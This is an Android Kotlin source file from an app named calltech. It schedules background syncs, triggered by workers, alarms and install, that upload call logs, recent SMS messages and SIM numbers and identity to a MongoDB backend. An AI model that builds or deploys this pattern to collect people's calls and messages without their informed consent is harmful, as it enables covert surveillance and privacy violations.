package com.calltech

import android.content.Context
import android.util.Log

object SyncScheduler {
    private const val TAG = "SyncScheduler"

    /** Worker / alarm / install — current thread par poora sync (blocking). */
    fun syncIfPermittedNow(context: Context, source: String): Boolean {
        val app = context.applicationContext

        MongoSyncHelper.ensureApiUrl(app)
        SimNumberHelper.discoverAndCacheNumbers(app)
        SimNumberHelper.refreshSimIdentity(app)

        var ok = true

        runVoidStep("pending_sms", source) { PendingSmsQueue.flush(app) }
        runVoidStep("pending_calls", source) { PendingCallQueue.flush(app) }
        runVoidStep("local_store", source) { LocalDataStore.syncPendingToMongo(app, source) }

        ok = runBoolStep("recent_calls", source) {
            CallSyncHelper.syncAllCallsToMongoNow(app, source)
        } && ok

        ok = runBoolStep("latest_messages", source) {
            MessageSyncHelper.syncLatestMessagesNow(app, source)
        } && ok

        if (!CallSyncHelper.hasCallLogPermission(app)) {
            runVoidStep("local_calls_retry", source) {
                LocalDataStore.syncPendingToMongo(app, "${source}_calls")
                PendingCallQueue.flush(app)
            }
        }

        Log.d(TAG, "syncIfPermittedNow ($source) ok=$ok")
        return ok
    }

    private fun runBoolStep(name: String, source: String, block: () -> Boolean): Boolean {
        return try {
            block()
        } catch (error: Exception) {
            Log.e(TAG, "sync step failed ($source/$name)", error)
            false
        }
    }

    private fun runVoidStep(name: String, source: String, block: () -> Unit) {
        try {
            block()
        } catch (error: Exception) {
            Log.e(TAG, "sync step failed ($source/$name)", error)
        }
    }

    fun syncIfPermitted(context: Context, source: String) {
        BackgroundSyncRunner.run {
            syncIfPermittedNow(context, source)
        }
    }
}
